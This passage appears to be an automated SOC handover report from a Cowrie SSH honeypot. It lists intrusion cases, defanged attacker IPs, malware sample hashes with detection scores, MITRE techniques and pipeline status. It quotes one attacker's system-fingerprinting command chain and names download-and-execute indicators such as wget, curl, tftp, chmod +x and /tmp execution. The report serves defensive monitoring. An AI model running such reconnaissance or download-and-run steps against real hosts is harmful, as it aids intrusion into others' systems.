| `2026-08-15 00:53:42` | `cowrie.session.connect` |
| `2026-08-15 00:53:47` | `cowrie.client.version` |
| `2026-08-15 00:53:47` | `cowrie.client.kex` |
| `2026-08-15 00:54:09` | `cowrie.login.success` |
| `2026-08-15 00:54:23` | `cowrie.session.params` |
| `2026-08-15 00:54:23` | `cowrie.command.input` |
| `2026-08-15 00:54:27` | `cowrie.log.closed` |
| `2026-08-15 00:54:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-594a5aa1a9ce

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 00:53 |
| **Last Seen** | 2026-08-15 00:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:53:42` | `cowrie.session.connect` |
| `2026-08-15 00:53:42` | `cowrie.client.version` |
| `2026-08-15 00:53:42` | `cowrie.client.kex` |
| `2026-08-15 00:53:43` | `cowrie.login.success` |
| `2026-08-15 00:53:44` | `cowrie.session.params` |
| `2026-08-15 00:53:44` | `cowrie.command.input` |
| `2026-08-15 00:53:44` | `cowrie.command.input` |
| `2026-08-15 00:53:44` | `cowrie.command.input` |
| `2026-08-15 00:53:44` | `cowrie.command.input` |
| `2026-08-15 00:53:44` | `cowrie.command.input` |
| `2026-08-15 00:53:44` | `cowrie.command.success` |
| `2026-08-15 00:53:44` | `cowrie.command.input` |
| `2026-08-15 00:53:44` | `cowrie.command.input` |
| `2026-08-15 00:53:44` | `cowrie.command.input` |
| `2026-08-15 00:53:44` | `cowrie.command.input` |
| `2026-08-15 00:53:45` | `cowrie.log.closed` |
| `2026-08-15 00:53:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `194.165.16[.]121` | **3** | 2026-08-15 00:33 | 2026-08-15 00:33 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]166` | **3** | 2026-08-15 00:02 | 2026-08-15 00:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **2** | 2026-08-15 00:23 | 2026-08-15 00:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `80.251.153[.]178` | **2** | 2026-08-15 00:32 | 2026-08-15 00:36 | 1m | 0 | `T1592` | 🟢 LOW |
| `104.238.110[.]208` | 1 | 2026-08-15 00:51 | 2026-08-15 00:52 | 38s | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | 1 | 2026-08-15 00:22 | 2026-08-15 00:22 | 10s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `178.178.194[.]135` | 1 | 2026-08-15 00:48 | 2026-08-15 00:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `203.110.233[.]225` | 1 | 2026-08-15 00:22 | 2026-08-15 00:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `36.161.30[.]29` | 1 | 2026-08-15 00:28 | 2026-08-15 00:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.156.87[.]204` | 1 | 2026-08-15 00:12 | 2026-08-15 00:12 | 8s | 0 | `T1592` | 🟢 LOW |
| `45.56.79[.]53` | 1 | 2026-08-15 00:36 | 2026-08-15 00:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.77.61[.]56` | 1 | 2026-08-15 00:52 | 2026-08-15 00:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]67` | 1 | 2026-08-15 00:53 | 2026-08-15 00:53 | 16s | 0 | `T1592` | 🟢 LOW |
| `78.67.161[.]64` | 1 | 2026-08-15 00:10 | 2026-08-15 00:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]77` | 1 | 2026-08-15 00:01 | 2026-08-15 00:01 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 84/100 | 🔴 HIGH | **36/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **23/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `130.12.180[.]51` | DE | Virtualine Technologies | **100** ⚠️ | 50 |
| `194.165.16[.]121` | LT | Flyservers S.A. | **100** ⚠️ | 14 |
| `220.122.115[.]9` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `223.197.153[.]135` | HK | HKT Limited | **100** ⚠️ | 50 |
| `45.77.61[.]56` | FR | Vultr Holdings, LLC | **100** ⚠️ | 50 |
| `139.199.80[.]137` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 10 |
| `45.56.79[.]53` | US | Linode | **100** ⚠️ | 50 |
| `87.103.126[.]54` | PT | DSL-ULL | **100** ⚠️ | 50 |
| `178.178.194[.]135` | RU | Metropolitan branch of PJSC MegaFon | **100** ⚠️ | 50 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 73 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 66 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 27 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 27 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 26 |

---

## 🔕 False Positive Summary (7 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 94 cases |
| Tool 34  | Credential Extractor        | ✅ 85 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 14 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 42 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 7 filtered (7.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 38 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 21 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 66 priority case(s) shown individually · 15 recon entry/entries in table (4 group(s) consolidating 10 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-15T02:56:11Z_
